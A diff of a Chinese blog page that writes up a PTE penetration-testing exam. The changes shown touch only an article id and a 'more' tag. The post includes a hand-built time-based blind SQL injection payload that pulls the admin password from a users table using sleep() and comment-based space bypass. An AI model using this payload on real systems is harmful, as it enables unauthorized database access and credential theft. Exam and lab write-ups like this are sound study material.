@@ -131,7 +131,7 @@
             <section class="inner">
                 <section class="inner-main">
                     <div class="post">
-    <article id="post-ckxo4tvbq0001hg4z4cr626ys" class="article article-type-post" itemscope
+    <article id="post-ckxo4x1l70003wk4zhxvf7rr8" class="article article-type-post" itemscope
     itemprop="blogPost">
 
     <div class="article-inner">
@@ -181,7 +181,7 @@
         </div>
 
         <div class="article-entry post-inner-html hairline" itemprop="articleBody">
-            <p>12月末参加了PTE考试，题不算难，但考试操作环境垃圾的一瞥，sqlmap不能跑，20道选择，5道基础题，1道综合题，如果不卡壳花4个小时做完也是很有压力。选择题就不说了，主要记录一下大题解法，当然方法不止一种。</p>
+            <p>12月末参加了PTE考试，题不算难，但考试操作环境垃圾的一瞥，sqlmap不能跑，20道选择，5道基础题，1道综合题，如果不卡壳花4个小时做完也是很有压力。选择题就不说了，主要记录一下大题解法，当然方法不止一种。<span id="more"></span></p>
 <h1 id="一、SQL注入"><a href="#一、SQL注入" class="headerlink" title="一、SQL注入"></a>一、SQL注入</h1><p>sqlmap长时间没更新，跑不起来，只能手注，使用二分法，利用burpsuite慢慢跑，阿西吧。</p>
 <pre><code class="hljs mysql">title=222%27/**/and/**/(if((ascii(substr((select/**/group_concat(password)/**/from/**/users1/**/where/**/username=&#x27;admin&#x27;),1,1))=107),sleep(5),0))/**/and/**/%27abc%27=%27abc&amp;content=/**/</code></pre>
 
